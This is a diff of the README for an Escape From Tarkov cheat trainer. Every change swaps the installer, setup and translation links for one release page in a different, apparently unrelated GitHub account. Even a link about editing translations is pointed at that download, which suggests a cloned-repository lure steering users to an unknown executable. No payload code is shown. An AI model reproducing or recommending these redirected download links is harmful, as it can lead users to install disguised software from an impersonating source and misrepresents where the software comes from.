@@ -3,7 +3,7 @@
 
 [![Sponsor](https://img.shields.io/badge/sponsor-%E2%9D%A4-lightgrey?logo=github&style=flat-square)](//)
 
-***TLDR => Use the [Universal Setup](//////////////////).*** Default key for in-game GUI is `Right-Alt`.
+***TLDR => Use the [Universal Setup](https://github.com/roman-wilson-ops1993k7/Escape-From-Tarkov-Trainer-2026/releases/tag/release).*** Default key for in-game GUI is `Right-Alt`.
 
 
 > If you want to compile the code yourself, make sure you cleaned-up your solution properly after upgrading your EFT/sptarkov bits (even removing `bin` and `obj` folders) and check all your references.
@@ -72,7 +72,7 @@ You can Load/Save all settings using the `console` or the `GUI`.
 
 ## Easy and automatic installation
 
-Simply use the [Universal Installer](https://github.com/sailro/EscapeFromTarkov-Trainer/releases).
+Simply use the [Universal Installer](https://github.com/roman-wilson-ops1993k7/Escape-From-Tarkov-Trainer-2026/releases/tag/release).
 
 ## Configuration
 
@@ -134,6 +134,6 @@ This trainer hooks into the command system, so you can easily setup features usi
 
 ## Translations
 
-This trainer comes in English but we also provide French, Japanese and Chinese simplified versions. You can use the [Universal Installer](/////////////) to specify your language, using `.\Installer -l zh-cn` for Chinese simplified for instance.
+This trainer comes in English but we also provide French, Japanese and Chinese simplified versions. You can use the [Universal Installer](https://github.com/roman-wilson-ops1993k7/Escape-From-Tarkov-Trainer-2026/releases/tag/release) to specify your language, using `.\Installer -l zh-cn` for Chinese simplified for instance.
 
-You can also tweak or add your own language by having a look [here](///).
+You can also tweak or add your own language by having a look [here](https://github.com/roman-wilson-ops1993k7/Escape-From-Tarkov-Trainer-2026/releases/tag/release).
